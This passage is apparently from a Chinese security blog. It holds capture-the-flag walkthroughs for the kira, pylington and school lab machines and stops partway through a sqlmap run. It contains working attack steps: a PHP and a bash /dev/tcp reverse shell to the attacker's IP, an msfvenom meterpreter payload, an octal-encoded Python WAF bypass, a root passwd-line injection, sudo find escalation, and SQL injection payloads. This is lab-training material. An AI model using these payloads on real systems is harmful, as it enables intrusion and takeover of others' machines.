<h3 id="发现目标"><a href="#发现目标" class="headerlink" title="发现目标"></a>发现目标</h3><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">arp-scan -l</span><br><span class="line"></span><br><span class="line"><span class="meta">&gt;</span><span class="bash">&gt;&gt;</span></span><br><span class="line">Interface: eth0, type: EN10MB, MAC: 00:0c:29:fa:35:f2, IPv4: 192.168.43.86</span><br><span class="line">Starting arp-scan 1.9.7 with 256 hosts (https://github.com/royhills/arp-scan)</span><br><span class="line">192.168.43.1    f2:19:51:a3:22:a0       (Unknown: locally administered)</span><br><span class="line">192.168.43.43   08:00:27:33:75:54       PCS Systemtechnik GmbH</span><br><span class="line">192.168.43.25   38:d2:ca:db:01:69       Zhejiang Tmall Technology Co., Ltd.</span><br><span class="line">192.168.43.188  d0:c6:37:be:7e:b3       Intel Corporate</span><br><span class="line"></span><br><span class="line">4 packets received by filter, 0 packets dropped by kernel</span><br><span class="line">Ending arp-scan 1.9.7: 256 hosts scanned in 1.994 seconds (128.39 hosts/sec). 4 responded</span><br></pre></td></tr></table></figure>

<ul>
<li>目标为 192.168.43.43</li>
<li>NMAP</li>
</ul>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">nmap -sV -A -p 1-65535 192.168.43.43</span><br><span class="line"></span><br><span class="line"><span class="meta">&gt;</span><span class="bash">&gt;&gt;</span></span><br><span class="line">Starting Nmap 7.80 ( https://nmap.org ) at 2021-01-10 01:33 EST</span><br><span class="line">Nmap scan report for 192.168.43.43</span><br><span class="line">Host is up (0.00032s latency).</span><br><span class="line">Not shown: 65534 closed ports</span><br><span class="line">PORT   STATE SERVICE VERSION</span><br><span class="line">80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))</span><br><span class="line">|_http-server-header: Apache/2.4.29 (Ubuntu)</span><br><span class="line">|_http-title: Site doesn't have a title (text/html).</span><br><span class="line">MAC Address: 08:00:27:33:75:54 (Oracle VirtualBox virtual NIC)</span><br><span class="line">No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).                                                                                                               </span><br><span class="line">TCP/IP fingerprint:                                                                                                                                                                                               </span><br><span class="line">OS:SCAN(V=7.80%E=4%D=1/10%OT=80%CT=1%CU=40204%PV=Y%DS=1%DC=D%G=Y%M=080027%T                                                                                                                                       </span><br><span class="line">OS:M=5FFA9FD3%P=x86_64-pc-linux-gnu)SEQ(SP=102%GCD=1%ISR=105%TI=Z%CI=Z%II=I                                                                                                                                       </span><br><span class="line">OS:%TS=A)OPS(O1=M5B4ST11NW7%O2=M5B4ST11NW7%O3=M5B4NNT11NW7%O4=M5B4ST11NW7%O                                                                                                                                       </span><br><span class="line">OS:5=M5B4ST11NW7%O6=M5B4ST11)WIN(W1=FE88%W2=FE88%W3=FE88%W4=FE88%W5=FE88%W6                                                                                                                                       </span><br><span class="line">OS:=FE88)ECN(R=Y%DF=Y%T=40%W=FAF0%O=M5B4NNSNW7%CC=Y%Q=)T1(R=Y%DF=Y%T=40%S=O                                                                                                                                       </span><br><span class="line">OS:%A=S+%F=AS%RD=0%Q=)T2(R=N)T3(R=N)T4(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=                                                                                                                                       </span><br><span class="line">OS:0%Q=)T5(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)T6(R=Y%DF=Y%T=40%W=0%                                                                                                                                       </span><br><span class="line">OS:S=A%A=Z%F=R%O=%RD=0%Q=)T7(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)U1(                                                                                                                                       </span><br><span class="line">OS:R=Y%DF=N%T=40%IPL=164%UN=0%RIPL=G%RID=G%RIPCK=G%RUCK=G%RUD=G)IE(R=Y%DFI=                                                                                                                                       </span><br><span class="line">OS:N%T=40%CD=S)</span><br><span class="line"></span><br><span class="line">Network Distance: 1 hop</span><br><span class="line"></span><br><span class="line">TRACEROUTE</span><br><span class="line">HOP RTT     ADDRESS</span><br><span class="line">1   0.32 ms 192.168.43.43</span><br><span class="line"></span><br><span class="line">OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .</span><br><span class="line">Nmap done: 1 IP address (1 host up) scanned in 20.69 seconds</span><br></pre></td></tr></table></figure>

<ul>
<li>目录扫描</li>
</ul>
<p><img data-src="./kira-ctf/1.png" alt></p>
<h3 id="web登录"><a href="#web登录" class="headerlink" title="web登录"></a>web登录</h3><p><img data-src="./kira-ctf/2.png" alt></p>
<ul>
<li>继续进行测试</li>
</ul>
<p><img data-src="./kira-ctf/3.png" alt></p>
<p><img data-src="./kira-ctf/4.png" alt></p>
<p>比较清晰，一个文件上传+一个文件包含</p>
<p><img data-src="./kira-ctf/5.png" alt></p>
<h3 id="图片马-LFI-拿shell"><a href="#图片马-LFI-拿shell" class="headerlink" title="图片马+LFI 拿shell"></a>图片马+LFI 拿shell</h3><p><img data-src="./kira-ctf/6.png" alt></p>
<ul>
<li><p>成功利用</p>
</li>
<li><p>服务器写马</p>
</li>
</ul>
<p><img data-src="./kira-ctf/7.png" alt></p>
<p>发现写不进去马，应该是 服务器没权限写文件</p>
<p>换一种方式，用php反弹shell</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    $sock=fsockopen(<span class="string">"192.168.43.86"</span>,<span class="number">7777</span>);exec(<span class="string">"/bin/sh -i &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3"</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<ul>
<li>发现反弹失败</li>
</ul>
<p><img data-src="./kira-ctf/8.png" alt></p>
<ul>
<li>用<code>msfvenom</code>工具生成木马</li>
</ul>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">msfvenom -p php/meterpreter/reverse_tcp lhost=192.168.43.86 lport=7777 -o ./ma.php</span><br><span class="line"><span class="meta">#</span><span class="bash"> lhost后的地址为kali攻击机的地址</span></span><br><span class="line"><span class="meta">#</span><span class="bash"> lport后的端口号为后续监听端口号</span></span><br><span class="line"><span class="meta">#</span><span class="bash"> -o后面为木马生成地址。</span></span><br></pre></td></tr></table></figure>

<p><img data-src="./kira-ctf/9.png" alt></p>
<ul>
<li><code>msf</code>大法</li>
</ul>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">msfconsole</span><br><span class="line">use exploit/multi/handler</span><br><span class="line">set payload php/meterpreter/reverse_tcp</span><br><span class="line">set lhost 192.168.43.86     # 本机ip</span><br><span class="line">set lport 7777       # 与前面的木马中的1234端口一致</span><br><span class="line">exploit</span><br></pre></td></tr></table></figure>

<p><img data-src="./kira-ctf/10.png" alt></p>
<p><img data-src="./kira-ctf/11.png" alt></p>
<p><img data-src="./kira-ctf/12.png" alt></p>
<p>发现账户密码</p>
<ul>
<li>交互shell 后 su</li>
</ul>
<p><img data-src="./kira-ctf/13.png" alt></p>
<ul>
<li><code>find</code>提权</li>
</ul>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">sudo find bassam-pass.txt -exec "/bin/sh" \;</span><br></pre></td></tr></table></figure>

<p><img data-src="./kira-ctf/14.png" alt></p>
<p><img data-src="./kira-ctf/15.png" alt></p>
]]></content>
      <categories>
        <category>靶场</category>
      </categories>
      <tags>
        <tag>入门</tag>
        <tag>综合靶场测试</tag>
      </tags>
  </entry>
  <entry>
    <title>pylington</title>
    <url>/2021/05/19/blog_formal/security/%E9%9D%B6%E5%9C%BA/web%E9%9D%B6%E5%9C%BA/finish/pylington/</url>
    <content><![CDATA[<h1 id="pylington"><a href="#pylington" class="headerlink" title="pylington"></a>pylington</h1><h2 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h2><p>​    一道boot2root的综合靶场练习</p>
<a id="more"></a>

<h2 id="基础环境"><a href="#基础环境" class="headerlink" title="基础环境"></a>基础环境</h2><ul>
<li>kali2020</li>
<li>pylington</li>
<li>windows10</li>
</ul>
<h2 id="测试步骤"><a href="#测试步骤" class="headerlink" title="测试步骤"></a>测试步骤</h2><h3 id="发现目标"><a href="#发现目标" class="headerlink" title="发现目标"></a>发现目标</h3><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">arp-scan -l</span><br><span class="line"></span><br><span class="line"><span class="meta">&gt;</span><span class="bash">&gt;&gt;</span></span><br><span class="line">root@weiyi:/home/weiyi/vulnhub/pylington# arp-scan -l                                                                                                                                                             </span><br><span class="line">Interface: eth0, type: EN10MB, MAC: 00:0c:29:3b:17:d5, IPv4: 192.168.43.92                                                                                                                                        </span><br><span class="line">Starting arp-scan 1.9.7 with 256 hosts (https://github.com/royhills/arp-scan)                                                                                                                                     </span><br><span class="line">192.168.43.1    26:ca:cd:37:40:d8       (Unknown: locally administered)                                                                                                                                           </span><br><span class="line">192.168.43.188  d0:c6:37:be:7e:b3       Intel Corporate                                                                                                                                                           </span><br><span class="line">192.168.43.252  08:00:27:bb:30:e2       PCS Systemtechnik GmbH                                                                                                                                                    </span><br><span class="line">3 packets received by filter, 0 packets dropped by kernel                    </span><br><span class="line">Ending arp-scan 1.9.7: 256 hosts scanned in 1.955 seconds (130.95 hosts/sec). 3 responded</span><br></pre></td></tr></table></figure>

<ul>
<li>目标为 <code>192.168.43.252</code></li>
<li><code>NMAP</code></li>
</ul>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">nmap -sC -sV -p- 192.168.43.252</span><br><span class="line"></span><br><span class="line"><span class="meta">&gt;</span><span class="bash">&gt;&gt;</span></span><br><span class="line">root@weiyi:/home/weiyi/vulnhub/pylington# nmap -sC -sV -p- 192.168.43.252</span><br><span class="line">Starting Nmap 7.91 ( https://nmap.org ) at 2021-05-19 07:50 EDT</span><br><span class="line">Nmap scan report for 192.168.43.252</span><br><span class="line">Host is up (0.00049s latency).</span><br><span class="line">Not shown: 65533 closed ports</span><br><span class="line">PORT   STATE SERVICE VERSION</span><br><span class="line">22/tcp open  ssh     OpenSSH 8.5 (protocol 2.0)</span><br><span class="line">| ssh-hostkey: </span><br><span class="line">|   3072 bf:ba:23:4e:69:37:69:9f:23:ae:21:35:98:4d:39:fa (RSA)</span><br><span class="line">|   256 ed:95:53:52:ef:70:1f:c0:0e:3c:d8:be:35:fc:3a:93 (ECDSA)</span><br><span class="line">|_  256 2d:b8:b0:88:52:83:7b:00:47:31:a4:76:2b:3d:7d:28 (ED25519)</span><br><span class="line">80/tcp open  http    Apache httpd 2.4.46 ((Unix) mod_wsgi/4.7.1 Python/3.9)</span><br><span class="line">|_http-generator: Jekyll v4.1.1</span><br><span class="line">| http-methods: </span><br><span class="line">|_  Potentially risky methods: TRACE</span><br><span class="line">| http-robots.txt: 3 disallowed entries </span><br><span class="line">|_/register /login /zbir7mn240soxhicso2z</span><br><span class="line">|_http-server-header: Apache/2.4.46 (Unix) mod_wsgi/4.7.1 Python/3.9</span><br><span class="line">|_http-title: Pylington Cloud | The best way to run Python.</span><br><span class="line">MAC Address: 08:00:27:BB:30:E2 (Oracle VirtualBox virtual NIC)</span><br><span class="line"></span><br><span class="line">Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .</span><br><span class="line">Nmap done: 1 IP address (1 host up) scanned in 9.38 seconds</span><br></pre></td></tr></table></figure>

<ul>
<li>目录扫描</li>
</ul>
<p><img data-src="./pylington/1.png" alt></p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">gobuster dir -u http://192.168.43.252/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x html,txt,php</span><br><span class="line"></span><br><span class="line"><span class="meta">&gt;</span><span class="bash">&gt;&gt;</span></span><br><span class="line">root@weiyi:/home/weiyi# gobuster dir -u http://192.168.43.252/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x html,txt,php</span><br><span class="line">===============================================================</span><br><span class="line">Gobuster v3.1.0</span><br><span class="line">by OJ Reeves (@TheColonial) &amp; Christian Mehlmauer (@firefart)</span><br><span class="line">===============================================================</span><br><span class="line">[+] Url:                     http://192.168.43.252/</span><br><span class="line">[+] Method:                  GET</span><br><span class="line">[+] Threads:                 10</span><br><span class="line">[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt</span><br><span class="line">[+] Negative Status codes:   404</span><br><span class="line">[+] User Agent:              gobuster/3.1.0</span><br><span class="line">[+] Extensions:              html,txt,php</span><br><span class="line">[+] Timeout:                 10s</span><br><span class="line">===============================================================</span><br><span class="line">2021/05/19 07:50:54 Starting gobuster in directory enumeration mode</span><br><span class="line">===============================================================</span><br><span class="line">/index.html           (Status: 200) [Size: 4065]</span><br><span class="line">/register             (Status: 301) [Size: 239] [--&gt; http://192.168.43.252/register/]</span><br><span class="line">/assets               (Status: 301) [Size: 237] [--&gt; http://192.168.43.252/assets/]  </span><br><span class="line">/login                (Status: 200) [Size: 3473]                                     </span><br><span class="line">/404.html             (Status: 200) [Size: 3305]                                     </span><br><span class="line">/robots.txt           (Status: 200) [Size: 83]                                       </span><br><span class="line">                                                                                     </span><br><span class="line">===============================================================</span><br><span class="line">2021/05/19 08:06:58 Finished</span><br><span class="line">===============================================================</span><br></pre></td></tr></table></figure>

<h3 id="登录web"><a href="#登录web" class="headerlink" title="登录web"></a>登录web</h3><ul>
<li>首页</li>
</ul>
<p><img data-src="./pylington/2.png" alt></p>
<ul>
<li>访问<a href="http://192.168.43.252/robots.txt" target="_blank" rel="noopener">http://192.168.43.252/robots.txt</a></li>
</ul>
<p><img data-src="./pylington/3.png" alt></p>
<ul>
<li>访问<a href="http://192.168.43.252/zbir7mn240soxhicso2z/" target="_blank" rel="noopener">http://192.168.43.252/zbir7mn240soxhicso2z/</a></li>
</ul>
<p><img data-src="./pylington/4.png" alt></p>
<p>获得账号密码<code>steve / bvbkukHAeVxtjjVH</code></p>
<h3 id="登入后台"><a href="#登入后台" class="headerlink" title="登入后台"></a>登入后台</h3><ul>
<li>发现是一个<code>python</code>解释器</li>
</ul>
<p><img data-src="./pylington/5.png" alt></p>
<ul>
<li>存在<code>waf</code></li>
</ul>
<p><img data-src="./pylington/6.png" alt></p>
<p><img data-src="./pylington/7.png" alt></p>
<ul>
<li>绕过<code>waf</code></li>
</ul>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">exec(<span class="number">8</span>进制)</span><br><span class="line"><span class="comment"># https://gchq.github.io/CyberChef/#recipe=To_Octal('Space')</span></span><br><span class="line">__import__(<span class="string">'os'</span>).system(<span class="string">'ls'</span>)</span><br><span class="line"><span class="comment"># \137\137\151\155\160\157\162\164\137\137\50\47\157\163\47\51\56\163\171\163\164\145\155\50\47\154\163\47\51</span></span><br></pre></td></tr></table></figure>

<ul>
<li>成功执行</li>
</ul>
<p><img data-src="./pylington/8.png" alt></p>
<h3 id="反弹shell"><a href="#反弹shell" class="headerlink" title="反弹shell"></a>反弹shell</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">bash -i &gt;&amp; &#x2F;dev&#x2F;tcp&#x2F;192.168.43.92&#x2F;7777 0&gt;&amp;1</span><br><span class="line">\137\137\151\155\160\157\162\164\137\137\50\47\157\163\47\51\56\163\171\163\164\145\155\50\47\142\141\163\150\40\55\151\40\76\46\40\57\144\145\166\57\164\143\160\57\61\71\62\56\61\66\70\56\64\63\56\71\62\57\67\67\67\67\40\60\76\46\61\47\51</span><br></pre></td></tr></table></figure>

<p><img data-src="./pylington/9.png" alt></p>
<p><img data-src="./pylington/10.png" alt></p>
<h3 id="提权-amp-amp-Flag"><a href="#提权-amp-amp-Flag" class="headerlink" title="提权&amp;&amp;Flag"></a>提权&amp;&amp;Flag</h3><p><img data-src="./pylington/11.png" alt></p>
<p>或者账号密码<code>py / 54ezhCGaJV</code></p>
<ul>
<li>发现可以用<code>root</code>写入文件</li>
</ul>
<p><img data-src="./pylington/12.png" alt></p>
<ul>
<li>生成一个<code>root</code>权限的账号密码</li>
</ul>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">root@weiyi:/home/weiyi# mkpasswd -m sha-512</span><br><span class="line">Password: </span><br><span class="line"><span class="meta">$</span><span class="bash">6<span class="variable">$yp5wO2arqdD9a0BR</span><span class="variable">$nR5ztOOaCeLWM9GmPcV2b</span>/y44tFR9NSBizYBJoUq7QfDdKfRyRSdjvfjsL7gJTCSQc8WNvmPFliMVPbplRc2z/</span></span><br><span class="line"></span><br><span class="line">weiyi:$6$yp5wO2arqdD9a0BR$nR5ztOOaCeLWM9GmPcV2b/y44tFR9NSBizYBJoUq7QfDdKfRyRSdjvfjsL7gJTCSQc8WNvmPFliMVPbplRc2z/:0:0:root:/root:/bin/bash</span><br></pre></td></tr></table></figure>

<p><img data-src="./pylington/13.png" alt></p>
<p><img data-src="./pylington/14.png" alt></p>
]]></content>
      <categories>
        <category>靶场</category>
        <category>other</category>
      </categories>
      <tags>
        <tag>入门</tag>
        <tag>综合靶场测试</tag>
      </tags>
  </entry>
  <entry>
    <title>school</title>
    <url>/2021/02/20/blog_formal/security/%E9%9D%B6%E5%9C%BA/web%E9%9D%B6%E5%9C%BA/finish/school/</url>
    <content><![CDATA[<h1 id="school"><a href="#school" class="headerlink" title="school"></a>school</h1><h2 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h2><p>​    一道boot2root的综合靶场练习</p>
<a id="more"></a>

<h2 id="基础环境"><a href="#基础环境" class="headerlink" title="基础环境"></a>基础环境</h2><ul>
<li>kali2020</li>
<li>school 2 flag</li>
<li>windows10</li>
</ul>
<h2 id="测试步骤"><a href="#测试步骤" class="headerlink" title="测试步骤"></a>测试步骤</h2><h3 id="发现目标"><a href="#发现目标" class="headerlink" title="发现目标"></a>发现目标</h3><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">arp-scan -l</span><br><span class="line"></span><br><span class="line"><span class="meta">&gt;</span><span class="bash">&gt;&gt;</span></span><br><span class="line">root@kali:/home/caixin# arp-scan -l</span><br><span class="line">Interface: eth0, type: EN10MB, MAC: 00:50:56:28:f2:ec, IPv4: 192.168.1.106</span><br><span class="line">Starting arp-scan 1.9.7 with 256 hosts (https://github.com/royhills/arp-scan)</span><br><span class="line">192.168.1.1     d0:76:e7:45:6f:f9       TP-LINK TECHNOLOGIES CO.,LTD.</span><br><span class="line">192.168.1.102   08:00:27:53:16:13       PCS Systemtechnik GmbH</span><br><span class="line">192.168.1.105   38:d5:47:11:43:e9       ASUSTek COMPUTER INC.</span><br><span class="line"></span><br><span class="line">3 packets received by filter, 0 packets dropped by kernel</span><br><span class="line">Ending arp-scan 1.9.7: 256 hosts scanned in 1.995 seconds (128.32 hosts/sec). 3 responded</span><br></pre></td></tr></table></figure>

<ul>
<li>目标为 <code>192.168.1.102</code></li>
<li>NMAP</li>
</ul>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">nmap -sV -A -p 1-65535 192.168.1.102</span><br><span class="line"></span><br><span class="line"><span class="meta">&gt;</span><span class="bash">&gt;&gt;</span></span><br><span class="line">oot@kali:/home/caixin# nmap -sV -A -p 1-65535 192.168.1.102</span><br><span class="line">Starting Nmap 7.80 ( https://nmap.org ) at 2021-02-20 00:16 EST</span><br><span class="line">Nmap scan report for 192.168.1.102</span><br><span class="line">Host is up (0.00047s latency).</span><br><span class="line">Not shown: 65532 closed ports</span><br><span class="line">PORT   STATE SERVICE VERSION</span><br><span class="line">22/tcp open  ssh     OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)</span><br><span class="line">| ssh-hostkey: </span><br><span class="line">|   2048 de:b5:23:89:bb:9f:d4:1a:b5:04:53:d0:b7:5c:b0:3f (RSA)</span><br><span class="line">|   256 16:09:14:ea:b9:fa:17:e9:45:39:5e:3b:b4:fd:11:0a (ECDSA)</span><br><span class="line">|_  256 9f:66:5e:71:b9:12:5d:ed:70:5a:4f:5a:8d:0d:65:d5 (ED25519)</span><br><span class="line">23/tcp open  telnet?</span><br><span class="line">| fingerprint-strings: </span><br><span class="line">|   DNSStatusRequestTCP, DNSVersionBindReqTCP, FourOhFourRequest, GenericLines, GetRequest, HTTPOptions, Help, JavaRMI, Kerberos, LANDesk-RC, LDAPBindReq, LDAPSearchReq, LPDString, NCP, NULL, NotesRPC, RPCCheck, RTSPRequest, SIPOptions, SMBProgNeg, SSLSessionReq, TLSSessionReq, TerminalServer, TerminalServerCookie, WMSRequest, X11Probe, afp, ms-sql-s, oracle-tns, tn3270: </span><br><span class="line">|_    Verification Code:</span><br><span class="line">80/tcp open  http    Apache httpd 2.4.38 ((Debian))</span><br><span class="line">|_http-server-header: Apache/2.4.38 (Debian)</span><br><span class="line">| http-title: 404 Not Found</span><br><span class="line">|_Requested resource was login.php</span><br><span class="line">1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :</span><br><span class="line">SF-Port23-TCP:V=7.80%I=7%D=2/20%Time=60309B24%P=x86_64-pc-linux-gnu%r(NULL</span><br><span class="line">SF:,1C,"Verification\x20Code:\n\0\0\0\xee\x1e@\0\xe2\x1c")%r(GenericLines,</span><br><span class="line">SF:1C,"Verification\x20Code:\n\0\0\0\xee\x1e@\0\xe2\x1c")%r(tn3270,1C,"Ver</span><br><span class="line">SF:ification\x20Code:\n\0\0\0\xee\x1e@\0\xe2\x1c")%r(GetRequest,1C,"Verifi</span><br><span class="line">SF:cation\x20Code:\n\0\0\0\xee\x1e@\0\xe2\x1c")%r(HTTPOptions,1C,"Verifica</span><br><span class="line">SF:tion\x20Code:\n\0\0\0\xee\x1e@\0\xe2\x1c")%r(RTSPRequest,1C,"Verificati</span><br><span class="line">SF:on\x20Code:\n\0\0\0\xee\x1e@\0\xe2\x1c")%r(RPCCheck,1C,"Verification\x2</span><br><span class="line">SF:0Code:\n\0\0\0\xee\x1e@\0\xe2\x1c")%r(DNSVersionBindReqTCP,1C,"Verifica</span><br><span class="line">SF:tion\x20Code:\n\0\0\0\xee\x1e@\0\xe2\x1c")%r(DNSStatusRequestTCP,1C,"Ve</span><br><span class="line">SF:rification\x20Code:\n\0\0\0\xee\x1e@\0\xe2\x1c")%r(Help,1C,"Verificatio</span><br><span class="line">SF:n\x20Code:\n\0\0\0\xee\x1e@\0\xe2\x1c")%r(SSLSessionReq,1C,"Verificatio</span><br><span class="line">SF:n\x20Code:\n\0\0\0\xee\x1e@\0\xe2\x1c")%r(TerminalServerCookie,1C,"Veri</span><br><span class="line">SF:fication\x20Code:\n\0\0\0\xee\x1e@\0\xe2\x1c")%r(TLSSessionReq,1C,"Veri</span><br><span class="line">SF:fication\x20Code:\n\0\0\0\xee\x1e@\0\xe2\x1c")%r(Kerberos,1C,"Verificat</span><br><span class="line">SF:ion\x20Code:\n\0\0\0\xee\x1e@\0\xe2\x1c")%r(SMBProgNeg,1C,"Verification</span><br><span class="line">SF:\x20Code:\n\0\0\0\xee\x1e@\0\xe2\x1c")%r(X11Probe,1C,"Verification\x20C</span><br><span class="line">SF:ode:\n\0\0\0\xee\x1e@\0\xe2\x1c")%r(FourOhFourRequest,1C,"Verification\</span><br><span class="line">SF:x20Code:\n\0\0\0\xee\x1e@\0\xe2\x1c")%r(LPDString,1C,"Verification\x20C</span><br><span class="line">SF:ode:\n\0\0\0\xee\x1e@\0\xe2\x1c")%r(LDAPSearchReq,1C,"Verification\x20C</span><br><span class="line">SF:ode:\n\0\0\0\xee\x1e@\0\xe2\x1c")%r(LDAPBindReq,1C,"Verification\x20Cod</span><br><span class="line">SF:e:\n\0\0\0\xee\x1e@\0\xe2\x1c")%r(SIPOptions,1C,"Verification\x20Code:\</span><br><span class="line">SF:n\0\0\0\xee\x1e@\0\xe2\x1c")%r(LANDesk-RC,1C,"Verification\x20Code:\n\0</span><br><span class="line">SF:\0\0\xee\x1e@\0\xe2\x1c")%r(TerminalServer,1C,"Verification\x20Code:\n\</span><br><span class="line">SF:0\0\0\xee\x1e@\0\xe2\x1c")%r(NCP,1C,"Verification\x20Code:\n\0\0\0\xee\</span><br><span class="line">SF:x1e@\0\xe2\x1c")%r(NotesRPC,1C,"Verification\x20Code:\n\0\0\0\xee\x1e@\</span><br><span class="line">SF:0\xe2\x1c")%r(JavaRMI,1C,"Verification\x20Code:\n\0\0\0\xee\x1e@\0\xe2\</span><br><span class="line">SF:x1c")%r(WMSRequest,1C,"Verification\x20Code:\n\0\0\0\xee\x1e@\0\xe2\x1c</span><br><span class="line">SF:")%r(oracle-tns,1C,"Verification\x20Code:\n\0\0\0\xee\x1e@\0\xe2\x1c")%</span><br><span class="line">SF:r(ms-sql-s,1C,"Verification\x20Code:\n\0\0\0\xee\x1e@\0\xe2\x1c")%r(afp</span><br><span class="line">SF:,1C,"Verification\x20Code:\n\0\0\0\xee\x1e@\0\xe2\x1c");</span><br><span class="line">MAC Address: 08:00:27:53:16:13 (Oracle VirtualBox virtual NIC)</span><br><span class="line">No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).</span><br><span class="line">TCP/IP fingerprint:</span><br><span class="line">OS:SCAN(V=7.80%E=4%D=2/20%OT=22%CT=1%CU=42722%PV=Y%DS=1%DC=D%G=Y%M=080027%T</span><br><span class="line">OS:M=60309B30%P=x86_64-pc-linux-gnu)SEQ(SP=106%GCD=1%ISR=108%TI=Z%CI=Z%II=I</span><br><span class="line">OS:%TS=A)OPS(O1=M5B4ST11NW7%O2=M5B4ST11NW7%O3=M5B4NNT11NW7%O4=M5B4ST11NW7%O</span><br><span class="line">OS:5=M5B4ST11NW7%O6=M5B4ST11)WIN(W1=FE88%W2=FE88%W3=FE88%W4=FE88%W5=FE88%W6</span><br><span class="line">OS:=FE88)ECN(R=Y%DF=Y%T=40%W=FAF0%O=M5B4NNSNW7%CC=Y%Q=)T1(R=Y%DF=Y%T=40%S=O</span><br><span class="line">OS:%A=S+%F=AS%RD=0%Q=)T2(R=N)T3(R=N)T4(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=</span><br><span class="line">OS:0%Q=)T5(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)T6(R=Y%DF=Y%T=40%W=0%</span><br><span class="line">OS:S=A%A=Z%F=R%O=%RD=0%Q=)T7(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)U1(</span><br><span class="line">OS:R=Y%DF=N%T=40%IPL=164%UN=0%RIPL=G%RID=G%RIPCK=G%RUCK=G%RUD=G)IE(R=Y%DFI=</span><br><span class="line">OS:N%T=40%CD=S)</span><br><span class="line"></span><br><span class="line">Network Distance: 1 hop</span><br><span class="line">Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel</span><br><span class="line"></span><br><span class="line">TRACEROUTE</span><br><span class="line">HOP RTT     ADDRESS</span><br><span class="line">1   0.47 ms 192.168.1.102</span><br><span class="line"></span><br><span class="line">OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .</span><br><span class="line">Nmap done: 1 IP address (1 host up) scanned in 25.31 seconds</span><br></pre></td></tr></table></figure>

<ul>
<li>目录扫描</li>
</ul>
<p><img data-src="./school/1.png" alt></p>
<h3 id="登录web"><a href="#登录web" class="headerlink" title="登录web"></a>登录web</h3><p><img data-src="./school/2.png" alt></p>
<ul>
<li>随手一个<code>sql</code>注入，万能密码登录</li>
</ul>
<p><img data-src="./school/3.png" alt></p>
<p><img data-src="./school/4.png" alt></p>
<ul>
<li>成功进入后台</li>
</ul>
<p><img data-src="./school/5.png" alt></p>
<ul>
<li>源代码发现提示</li>
</ul>
<p><img data-src="./school/6.png" alt></p>
<p>猜测存在文件上传<code>getshell</code>操作</p>
<h3 id="sqlmap跑一波"><a href="#sqlmap跑一波" class="headerlink" title="sqlmap跑一波"></a>sqlmap跑一波</h3><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">python sqlmap.py -r 1.txt --level 3 --risk 3</span><br><span class="line"></span><br><span class="line"><span class="meta">&gt;</span><span class="bash">&gt;&gt;</span></span><br><span class="line">---</span><br><span class="line">Parameter: username (POST)</span><br><span class="line">    Type: boolean-based blind</span><br><span class="line">    Title: OR boolean-based blind - WHERE or HAVING clause (NOT)</span><br><span class="line">    Payload: username=1' OR NOT 5447=5447-- LQim&amp;password=1</span><br><span class="line"></span><br><span class="line">    Type: error-based</span><br><span class="line">    Title: MySQL &gt;= 5.0 OR error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)</span><br><span class="line">    Payload: username=1' OR (SELECT 6992 FROM(SELECT COUNT(*),CONCAT(0x7162786a71,(SELECT (ELT(6992=6992,1))),0x716a6a6271,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)-- VEgw&amp;password=1</span><br><span class="line"></span><br><span class="line">    Type: time-based blind</span><br><span class="line">    Title: MySQL &gt;= 5.0.12 AND time-based blind (query SLEEP)</span><br><span class="line">    Payload: username=1' AND (SELECT 1983 FROM (SELECT(SLEEP(5)))sPJh)-- ElNx&amp;password=1</span><br><span class="line">---</span><br><span class="line">[00:40:19] [INFO] the back-end DBMS is MySQL</span><br><span class="line">you provided a HTTP Cookie header value, while target URL provides its own cookies within HTTP Set-Cookie header which intersect with yours. Do you want to merge them in further requests? [Y/n] web server operating system: Linux Debian 10 (buster)</span><br><span class="line">web application technology: Apache 2.4.38</span><br><span class="line">back-end DBMS: MySQL &gt;= 5.0 (MariaDB fork)</span><br><span class="line">[00:40:23] [INFO] fetched data logged to text files under '/root/.local/share/sqlmap/output/192.168.1.102'</span><br><span class="line"></span><br><span class="line">[*] ending @ 00:40:23 /2021-02-20/</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">python sqlmap.py -r 1.txt --level 3 --risk 3 --dbs</span><br><span class="line"></span><br><span 